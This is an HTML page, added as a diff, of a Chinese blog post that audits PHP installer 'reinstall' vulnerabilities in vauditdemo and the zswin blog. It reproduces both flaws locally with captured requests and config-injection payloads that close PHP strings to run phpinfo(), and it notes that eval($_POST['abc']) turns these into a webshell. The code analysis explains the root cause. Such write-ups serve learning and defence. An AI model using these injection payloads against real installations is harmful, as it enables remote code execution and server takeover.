@@ -1,0 +1,211 @@
+<!DOCTYPE html>
+<html lang="zh">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="renderer" content="webkit">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+    <title>
+        Threezh1&#39;Blog
+    </title>
+    
+<link rel="stylesheet" href="/libs/highlight/styles/monokai-sublime.css">
+
+    
+<link rel="stylesheet" href="/libs/font-awesome/css/font-awesome.min.css">
+
+    
+<link rel="stylesheet" href="/css/style.css">
+
+<meta name="generator" content="Hexo 5.2.0"></head>
+
+<body id="bodyx">
+    <div class="hd posts">
+    <a href="/index.html"><i class="fa fa-reply replay-btn" aria-hidden="true"></i></a>
+    <div class="post-title">
+        <p>
+            PHP代码审计之重装漏洞
+        </p>
+        <hr>
+    </div>
+    <div class="post-content">
+        <!--Table of Contents begin-->
+        
+            <div id="toc" class="toc-article">
+            <strong class="toc-title">目录</strong>
+            <a class="js-toggle-toc" href="javascript:void(0)"></a>
+            <div class="toc-content">
+                <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%87%8D%E8%A3%85%E6%BC%8F%E6%B4%9E"><span class="toc-text">重装漏洞</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%A4%8D%E7%8E%B0-vauditdemo%E9%87%8D%E8%A3%85%E6%BC%8F%E6%B4%9E"><span class="toc-text">复现 vauditdemo重装漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0"><span class="toc-text">漏洞复现</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90"><span class="toc-text">代码分析</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#zswin%E5%8D%9A%E5%AE%A2%E9%87%8D%E8%A3%85%E6%BC%8F%E6%B4%9E-getshell-%E5%A4%8D%E7%8E%B0"><span class="toc-text">zswin博客重装漏洞 getshell 复现</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-1"><span class="toc-text">漏洞复现</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90-1"><span class="toc-text">代码分析</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%81%87%E5%88%B0%E7%9A%84%E9%97%AE%E9%A2%98"><span class="toc-text">遇到的问题</span></a></li></ol>
+            </div>
+            </div>
+        
+        <!--Table of Contents end -->
+        <h2 id="重装漏洞"><a href="#重装漏洞" class="headerlink" title="重装漏洞"></a>重装漏洞</h2><p>根据大佬们的总结，重装漏洞可以以下几种类型：</p>
+<ol>
+<li><p>自动删除这个安装文件</p>
+<p> 通过生成一个lock文件来判断程序是否安装过</p>
+</li>
+<li><p>根本无验证</p>
+<p> 安装完成后不会自动删除文件，又不会生成lock判断是否安装过</p>
+<a id="more"></a></li>
+<li><p>安装file</p>
+<p> 直接用GET提交step绕过，直接进入下一步</p>
+</li>
+<li><p>变量覆盖导致重装</p>
+<p> 可以GET,POST,COOKIE 任意提交一个变量名$insLockfile,给其赋空值，覆盖掉$insLockfile,从而让file_exists为false就不会退出</p>
+</li>
+<li><p>判断lock后，无exit</p>
+<p> 判断是否存在lock文件，如果存在lock文件，就会header到index.php,但是header后并没有exit，所以 并不会退出，类似的还有javascript弹个框</p>
+</li>
+<li><p>解析漏洞</p>
+<p> 在安装完成后会将install.php 重命名为index.php.bak,但是由于Apache的解析漏洞：如果无法识别到最后一个后缀的话，就会向上解析，那么就又变成了php了，然后结合安装时的变量覆盖又成重装了。</p>
+</li>
+<li><p>满足一些条件不会退出的</p>
+</li>
+</ol>
+<p>这次复现的两个漏洞，都属于第五类。当页面跳转到主页之后，原来的php进程依然存在，导致可以重装，而当配置信息没有经过过滤而被直接写入了文件当中，就可能会导致getshell。寻找此类漏洞应该尝试去跟踪配置信息的最终去处，并检查是否有过滤。通过构造闭合语句利用漏洞。</p>
+<h2 id="复现-vauditdemo重装漏洞"><a href="#复现-vauditdemo重装漏洞" class="headerlink" title="复现 vauditdemo重装漏洞"></a>复现 vauditdemo重装漏洞</h2><h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>访问 <a target="_blank" rel="noopener" href="http://127.0.0.1/install/install.php">http://127.0.0.1/install/install.php</a></p>
+<p>提交数据库信息，用brupsuite抓包。(为了便于演示，我将header()语句注释了)</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F;install&#x2F;install.php HTTP&#x2F;1.1</span><br><span class="line">Host: 127.0.0.1</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64; rv:63.0) Gecko&#x2F;20100101 Firefox&#x2F;63.0</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,*&#x2F;*;q&#x3D;0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.8,zh-TW;q&#x3D;0.7,zh-HK;q&#x3D;0.5,en-US;q&#x3D;0.3,en;q&#x3D;0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Referer: http:&#x2F;&#x2F;127.0.0.1&#x2F;install&#x2F;install.php</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br><span class="line">Content-Length: 84</span><br><span class="line">Connection: close</span><br><span class="line">Cookie: PHPSESSID&#x3D;jfjge50g22ieqm7ib5ia1quf73</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line"></span><br><span class="line">dbhost&#x3D;localhost&amp;dbuser&#x3D;root&amp;dbpass&#x3D;root&amp;dbname&#x3D;vauditdemo&amp;Submit&#x3D;%E5%AE%89%E8%A3%9D</span><br></pre></td></tr></table></figure>
+
+<p>将dbname修改为：</p>
+<pre><code>testdb;-- -&quot;;phpinfo();//</code></pre>
+<p>提交。</p>
+<p><img src="https://i.loli.net/2019/05/18/5ce001381792a52779.jpg" alt="1_install_success.jpg"></p>
+<p>跳转到index之后可以看到phpinfo()信息</p>
+<p><img src="https://i.loli.net/2019/05/18/5ce001360367555804.jpg" alt="1_phpinfo.jpg"></p>
+<p>复现成功</p>
+<h3 id="代码分析"><a href="#代码分析" class="headerlink" title="代码分析"></a>代码分析</h3><p>平台的install.php安装页面, 安装之前会有一段验证是否已经安装的判断语句：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( file_exists(<span class="variable">$_SERVER</span>[<span class="string">&quot;DOCUMENT_ROOT&quot;</span>].<span class="string">&#x27;/sys/install.lock&#x27;</span>) ) &#123;</span><br><span class="line">	header( <span class="string">&quot;Location: ../index.php&quot;</span> );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>判断安装生成的lock文件是否存在，如果存在，就重定向到index.php</p>
+<p>但是这里存在一个错误，当页面重定向到index之后，并没有执行exit语句来结束进程，所以install.php的进程一直存在。这时如果用brupsuite抓包，提交的数据会被判断语句之后的代码所执行，就会导致重装漏洞。</p>
+<p>判断语句后，获取了一些环境信息之后就通过POST方法获取数据库的信息。</p>
+<p>(代码经过省略)</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( <span class="variable">$_POST</span> ) &#123;</span><br><span class="line"></span><br><span class="line">	...</span><br><span class="line"></span><br><span class="line">	<span class="variable">$dbhost</span> = <span class="variable">$_POST</span>[<span class="string">&quot;dbhost&quot;</span>];</span><br><span class="line">	<span class="variable">$dbuser</span> = <span class="variable">$_POST</span>[<span class="string">&quot;dbuser&quot;</span>];</span><br><span class="line">	<span class="variable">$dbpass</span> = <span class="variable">$_POST</span>[<span class="string">&quot;dbpass&quot;</span>];</span><br><span class="line">	<span class="variable">$dbname</span> = <span class="variable">$_POST</span>[<span class="string">&quot;dbname&quot;</span>];</span><br><span class="line"></span><br><span class="line">	...</span><br><span class="line"></span><br><span class="line">	mysql_query( <span class="string">&quot;CREATE DATABASE <span class="subst">$dbname</span>&quot;</span>, <span class="variable">$con</span> ) <span class="keyword">or</span> <span class="keyword">die</span> ( mysql_error() );</span><br><span class="line"></span><br><span class="line">	<span class="variable">$str_tmp</span>=<span class="string">&quot;&lt;?php\r\n&quot;</span>;</span><br><span class="line">	<span class="variable">$str_end</span>=<span class="string">&quot;?&gt;&quot;</span>;</span><br><span class="line">	<span class="variable">$str_tmp</span>.=<span class="string">&quot;\r\n&quot;</span>;</span><br><span class="line">	<span class="variable">$str_tmp</span>.=<span class="string">&quot;error_reporting(0);\r\n&quot;</span>;</span><br><span class="line">	<span class="variable">$str_tmp</span>.=<span class="string">&quot;\r\n&quot;</span>;</span><br><span class="line">	<span class="variable">$str_tmp</span>.=<span class="string">&quot;if (!file_exists(\$_SERVER[\&quot;DOCUMENT_ROOT\&quot;].&#x27;/sys/install.lock&#x27;))&#123;\r\n\theader(\&quot;Location: /install/install.php\&quot;);\r\nexit;\r\n&#125;\r\n&quot;</span>;</span><br><span class="line">	<span class="variable">$str_tmp</span>.=<span class="string">&quot;\r\n&quot;</span>;</span><br><span class="line">	<span class="variable">$str_tmp</span>.=<span class="string">&quot;include_once(&#x27;../sys/lib.php&#x27;);\r\n&quot;</span>;</span><br><span class="line">	<span class="variable">$str_tmp</span>.=<span class="string">&quot;\r\n&quot;</span>;</span><br><span class="line">	<span class="variable">$str_tmp</span>.=<span class="string">&quot;\$host=\&quot;<span class="subst">$dbhost</span>\&quot;; \r\n&quot;</span>;</span><br><span class="line">	<span class="variable">$str_tmp</span>.=<span class="string">&quot;\$username=\&quot;<span class="subst">$dbuser</span>\&quot;; \r\n&quot;</span>;</span><br><span class="line">	<span class="variable">$str_tmp</span>.=<span class="string">&quot;\$password=\&quot;<span class="subst">$dbpass</span>\&quot;; \r\n&quot;</span>;</span><br><span class="line">	<span class="variable">$str_tmp</span>.=<span class="string">&quot;\$database=\&quot;<span class="subst">$dbname</span>\&quot;; \r\n&quot;</span>;</span><br><span class="line">	<span class="variable">$str_tmp</span>.=<span class="string">&quot;\r\n&quot;</span>;</span><br><span class="line">	<span class="variable">$str_tmp</span>.=<span class="string">&quot;\$conn = mysql_connect(\$host,\$username,\$password);\r\n&quot;</span>;</span><br><span class="line">	<span class="variable">$str_tmp</span>.=<span class="string">&quot;mysql_query(&#x27;set names utf8&#x27;,\$conn);\r\n&quot;</span>;</span><br><span class="line">	<span class="variable">$str_tmp</span>.=<span class="string">&quot;mysql_select_db(\$database, \$conn) or die(mysql_error());\r\n&quot;</span>;</span><br><span class="line">	<span class="variable">$str_tmp</span>.=<span class="string">&quot;if (!\$conn)\r\n&quot;</span>;</span><br><span class="line">	<span class="variable">$str_tmp</span>.=<span class="string">&quot;&#123;\r\n&quot;</span>;</span><br><span class="line">	<span class="variable">$str_tmp</span>.=<span class="string">&quot;\tdie(&#x27;Could not connect: &#x27; . mysql_error());\r\n&quot;</span>;</span><br><span class="line">	<span class="variable">$str_tmp</span>.=<span class="string">&quot;\texit;\r\n&quot;</span>;</span><br><span class="line">	<span class="variable">$str_tmp</span>.=<span class="string">&quot;&#125;\r\n&quot;</span>;</span><br><span class="line">	<span class="variable">$str_tmp</span>.=<span class="string">&quot;\r\n&quot;</span>;</span><br><span class="line">	<span class="variable">$str_tmp</span>.=<span class="string">&quot;session_start();\r\n&quot;</span>;</span><br><span class="line">	<span class="variable">$str_tmp</span>.=<span class="string">&quot;\r\n&quot;</span>;</span><br><span class="line">	<span class="variable">$str_tmp</span>.=<span class="variable">$str_end</span>;</span><br><span class="line"></span><br><span class="line">	<span class="variable">$fp</span>=fopen( <span class="string">&quot;../sys/config.php&quot;</span>, <span class="string">&quot;w&quot;</span> );</span><br><span class="line">	fwrite( <span class="variable">$fp</span>, <span class="variable">$str_tmp</span> );</span><br><span class="line">	fclose( <span class="variable">$fp</span> );</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>可以看到，页面通过所提交的dbhost, dbuser, dbpass, dbname来获取数据库基本信息。</p>
+<p>在判断数据库信息是否符合安装条件之后，页面将一段判断是否已经安装的php脚本写入到config.php里。</p>
+<p>问题出在其中的一条语句：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$str_tmp</span>.=<span class="string">&quot;\$database=\&quot;<span class="subst">$dbname</span>\&quot;; \r\n&quot;</span>;</span><br></pre></td></tr></table></figure>
+
+<p>可知，dbname是可控的。</p>
+<p>当我们将dbname设置为：</p>
+<pre><code>testdb;-- -&quot;;phpinfo();//
+
+-- -     是为了注释掉后面的sql语句
+&quot;;        闭合php语句
+//        注释掉后面的php语句</code></pre>
+<p>config.php里的语句就会变成：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$database</span>=<span class="string">&quot;testdb; -- -&quot;</span>; phpinfo();<span class="comment">//&quot;;</span></span><br></pre></td></tr></table></figure>
+
+<p>也就会执行phpinfo(), 当我们把phpinfo()修改为：<code>eval($_POST[&#39;abc&#39;])</code>就可以直接getshell；</p>
+<h2 id="zswin博客重装漏洞-getshell-复现"><a href="#zswin博客重装漏洞-getshell-复现" class="headerlink" title="zswin博客重装漏洞 getshell 复现"></a>zswin博客重装漏洞 getshell 复现</h2><p>在百度上直接搜到的一个重装漏洞，博客系统有点老了，但是拿来学习还是不错的。</p>
+<p>参考：<a target="_blank" rel="noopener" href="https://shuimugan.com/bug/view?bug_no=119025">https://shuimugan.com/bug/view?bug_no=119025</a></p>
+<h3 id="漏洞复现-1"><a href="#漏洞复现-1" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>在已经安装好的博客，直接访问：</p>
+<p><a target="_blank" rel="noopener" href="http://127.0.0.1/zwin/install.php?m=install&amp;c=index&amp;a=setconf">http://127.0.0.1/zwin/install.php?m=install&amp;c=index&amp;a=setconf</a></p>
+<p>不会跳转到主页，直接进入安装向导页面。</p>
+<p>其他地方正常填写，将数据表前缀改为：</p>
+<pre><code>zs_&#39;);phpinfo();//</code></pre>
+<p><img src="https://i.loli.net/2019/05/19/5ce0b569747fd26998.jpg" alt="2_tianxie.jpg"></p>
+<p>点击下一步，数据库就可以创建成功</p>
+<p><img src="https://i.loli.net/2019/05/19/5ce0b569337d168459.jpg" alt="2_chuangjianxchenggong.jpg"></p>
+<p>之后再访问：</p>
+<p><a target="_blank" rel="noopener" href="http://127.0.0.1/zwin/app/user/conf/config.php">http://127.0.0.1/zwin/app/user/conf/config.php</a></p>
+<p><img src="https://i.loli.net/2019/05/19/5ce0b56abedb011742.jpg" alt="2_config.jpg"></p>
+<p>可以看到phpinfo()，把phpinfo()修改为：<code>eval($_POST[&#39;abc&#39;])</code>就可以直接getshell；</p>
+<p>漏洞复现成功</p>
+<h3 id="代码分析-1"><a href="#代码分析-1" class="headerlink" title="代码分析"></a>代码分析</h3><p>存在漏洞的页面：</p>
+<p>install/install/controller/indexcontroller.class.php</p>
+<p>页面开头存在一个index()方法用于判断是否安装成功：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">   <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">   <span class="keyword">if</span> (is_file(<span class="string">&#x27;./Data/install.lock&#x27;</span>)) &#123;</span><br><span class="line">	header(<span class="string">&#x27;Location: ./index.php&#x27;</span>);</span><br><span class="line">	<span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>根据参考文章的说法：</p>
+<pre><code>但是这个不是类的初始化函数所以不影响其他方法的使用。</code></pre>
+<p>我在页面当中没有找到引用index()方法的语句，应该是ThinkPHP框架的一些固定用法吧。这个问题等后面学习了ThinkPHP框架后再说。</p>
+<p>继续往下看。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">finish_done</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">		...</span><br><span class="line"></span><br><span class="line">		<span class="variable">$auth</span>  = build_auth_key();</span><br><span class="line">		</span><br><span class="line">		<span class="variable">$config_data</span>[<span class="string">&#x27;DB_TYPE&#x27;</span>] = <span class="variable">$temp_info</span>[<span class="string">&#x27;db_type&#x27;</span>];</span><br><span class="line">		<span class="variable">$config_data</span>[<span class="string">&#x27;DB_HOST&#x27;</span>] = <span class="variable">$temp_info</span>[<span class="string">&#x27;db_host&#x27;</span>];</span><br><span class="line">		<span class="variable">$config_data</span>[<span class="string">&#x27;DB_NAME&#x27;</span>] = <span class="variable">$temp_info</span>[<span class="string">&#x27;db_name&#x27;</span>];</span><br><span class="line">		<span class="variable">$config_data</span>[<span class="string">&#x27;DB_USER&#x27;</span>] = <span class="variable">$temp_info</span>[<span class="string">&#x27;db_user&#x27;</span>];</span><br><span class="line">		<span class="variable">$config_data</span>[<span class="string">&#x27;DB_PWD&#x27;</span>] = <span class="variable">$temp_info</span>[<span class="string">&#x27;db_pass&#x27;</span>];</span><br><span class="line">		<span class="variable">$config_data</span>[<span class="string">&#x27;DB_PORT&#x27;</span>] = <span class="variable">$temp_info</span>[<span class="string">&#x27;db_port&#x27;</span>];</span><br><span class="line">		<span class="variable">$config_data</span>[<span class="string">&#x27;DB_PREFIX&#x27;</span>] = $&lt;strong&gt;temp_info&lt;/strong&gt;[<span class="string">&#x27;db_prefix&#x27;</span>];</span><br><span class="line">		<span class="variable">$db</span> = Db::getInstance(<span class="variable">$config_data</span>);</span><br><span class="line">		<span class="variable">$config_data</span>[<span class="string">&#x27;WEB_MD5&#x27;</span>] = <span class="variable">$auth</span>;</span><br><span class="line">		<span class="variable">$conf</span> 	=	write_config(<span class="variable">$config_data</span>);</span><br><span class="line">		</span><br><span class="line">		...</span><br><span class="line">	&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+<p>可知，在finish_done()方法中，有一个函数为write_config(),所传递的参数为数据库配置信息。</p>
+<p>而这些数据配置信息，都没有经过过滤或检查。都是直接接收POST数据来进行传递的。</p>
+<p>跟踪这个函数至：install/install/common/function.php</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">write_config</span>(<span class="params"><span class="variable">$config</span>, <span class="variable">$auth</span></span>)</span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(is_array(<span class="variable">$config</span>))&#123;</span><br><span class="line">		<span class="comment">//读取配置内容</span></span><br><span class="line">		<span class="variable">$conf</span> = file_get_contents(MODULE_PATH . <span class="string">&#x27;sqldata/conf.tpl&#x27;</span>);</span><br><span class="line">		<span class="variable">$user</span> = file_get_contents(MODULE_PATH . <span class="string">&#x27;sqldata/user.tpl&#x27;</span>);</span><br><span class="line">		<span class="comment">//替换配置项</span></span><br><span class="line">		<span class="keyword">foreach</span> (<span class="variable">$config</span> <span class="keyword">as</span> <span class="variable">$name</span> =&gt; <span class="variable">$value</span>) &#123;</span><br><span class="line">			<span class="variable">$conf</span> = str_replace(<span class="string">&quot;[<span class="subst">&#123;$name&#125;</span>]&quot;</span>, <span class="variable">$value</span>, <span class="variable">$conf</span>);</span><br><span class="line">			<span class="variable">$user</span> = str_replace(<span class="string">&quot;[<span class="subst">&#123;$name&#125;</span>]&quot;</span>, <span class="variable">$value</span>, <span class="variable">$user</span>);</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="comment">//写入应用配置文件</span></span><br><span class="line">        file_put_contents(<span class="string">&#x27;./App/Common/Conf/config.php&#x27;</span>, <span class="variable">$conf</span>);</span><br><span class="line">        file_put_contents(<span class="string">&#x27;./App/User/Conf/config.php&#x27;</span>, <span class="variable">$user</span>);</span><br><span class="line">		<span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>可知，函数的功能是读取sqldata目录下的两个配置文件，将传递进来的数据库配置信息分别写入到两个config.php里去。</p>
+<p>先看一下user.sql:</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * UCenter客户端配置文件</span></span><br><span class="line"><span class="comment"> * 注意：该配置文件请使用常量方式定义</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line">define(<span class="string">&#x27;UC_APP_ID&#x27;</span>, <span class="number">1</span>); <span class="comment">//应用ID</span></span><br><span class="line">define(<span class="string">&#x27;UC_API_TYPE&#x27;</span>, <span class="string">&#x27;Model&#x27;</span>); <span class="comment">//可选值 Model / Service</span></span><br><span class="line">define(<span class="string">&#x27;UC_AUTH_KEY&#x27;</span>, <span class="string">&#x27;[WEB_MD5]&#x27;</span>); <span class="comment">//加密KEY</span></span><br><span class="line">define(<span class="string">&#x27;UC_DB_DSN&#x27;</span>, <span class="string">&#x27;[DB_TYPE]://[DB_USER]:[DB_PWD]@[DB_HOST]:[DB_PORT]/[DB_NAME]&#x27;</span>); <span class="comment">// 数据库连接，使用Model方式调用API必须配置此项</span></span><br><span class="line">define(<span class="string">&#x27;UC_TABLE_PREFIX&#x27;</span>, <span class="string">&#x27;[DB_PREFIX]&#x27;</span>); <span class="comment">// 数据表前缀，使用Model方式调用API必须配置此项</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>除了DB_NAME, DB_PREFIX可以修改以外，修改其他的数据配置会导致数据库创建失败。</p>
+<p>所以，这里可以利用的就存在两处</p>
+<p>将DB_NAME赋值为：</p>
+<pre><code>zswin1]&#39;);phpinfo();//</code></pre>
+<p>或者将DB_PREFIX赋值为：</p>
+<pre><code>zs_&#39;);phpinfo();//</code></pre>
+<p>都可以利用成功。</p>
+<p>/App/User/Conf/config.php就会变成：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">define(<span class="string">&#x27;UC_DB_DSN&#x27;</span>, <span class="string">&#x27;mysql://root:root@127.0.0.1:3306/zswin1]&#x27;</span>);phpinfo();<span class="comment">//&#x27;); // 数据库连接，使用Model方式调用API必须配置此项</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//或者</span></span><br><span class="line"></span><br><span class="line">define(<span class="string">&#x27;UC_TABLE_PREFIX&#x27;</span>, <span class="string">&#x27;zs_&#x27;</span>);phpinfo();<span class="comment">//&#x27;); // 数据表前缀，使用Model方式调用API必须配置此项</span></span><br></pre></td></tr></table></figure>
+
+<p>sqldata/conf.tpl也是一样的步骤，只不过user.tql可以更容易闭合语句。</p>
+<h2 id="遇到的问题"><a href="#遇到的问题" class="headerlink" title="遇到的问题"></a>遇到的问题</h2><ul>
+<li>对框架的结构还是不太了解，是否调用，如何调用也不太清楚。需要去学习一下框架的基本知识。</li>
+</ul>
+
+    </div>
+
+    
+</div>
+    <div class="footer" id="footer">
+    <p>Copyright © 2020 Threezh1
+        <!-- <label class="el-switch el-switch-green el-switch-sm" style="vertical-align: sub;">
+            <input type="checkbox" name="switch" id="update_style">
+            <span class="el-switch-style"></span>
+        </label> -->
+<!--         <script type="text/javascript">
+        var cnzz_protocol = (("https:" == document.location.protocol) ? "https://" : "http://");
+        document.write(unescape("%3Cspan id='cnzz_stat_icon_1278548644'%3E%3C/span%3E%3Cscript src='" + cnzz_protocol + "v1.cnzz.com/stat.php%3Fid%3D1278548644%26show%3Dpic1' type='text/javascript'%3E%3C/script%3E"));
+        </script> -->
+    </p>
+</div>
+<input type="hidden" id="web_style" value="black">
+<input type="hidden" id="valine_appid" value="CmCti21ooOOIzFOhEyFkFvR0-gzGzoHsz">
+<input type="hidden" id="valine_appKey" value="FqiyUqbg7McKN2eG0MCewupf">
+
+<script src="/libs/jquery.min.js"></script>
+
+
+<script src="/libs/highlight/highlight.pack.js"></script>
+
+<script src='//cdn.jsdelivr.net/npm/valine@1.3.10/dist/Valine.min.js'></script>
+
+<script src="/js/js.js"></script>
+
+<style type="text/css">
+.v * {
+    color: #698fca;
+}
+
+.v .vlist .vcard .vhead .vsys {
+    color: #3a3e4a;
+}
+
+.v .vlist .vcard .vh .vmeta .vat {
+    color: #638fd5;
+}
+
+.v .vlist .vcard .vhead .vnick {
+    color: #6ba1ff;
+}
+
+.v a {
+    color: #8696b1;
+}
+
+.v .vlist .vcard .vhead .vnick:hover {
+    color: #669bfc;
+}
+</style>
+</body>
+
+</html>
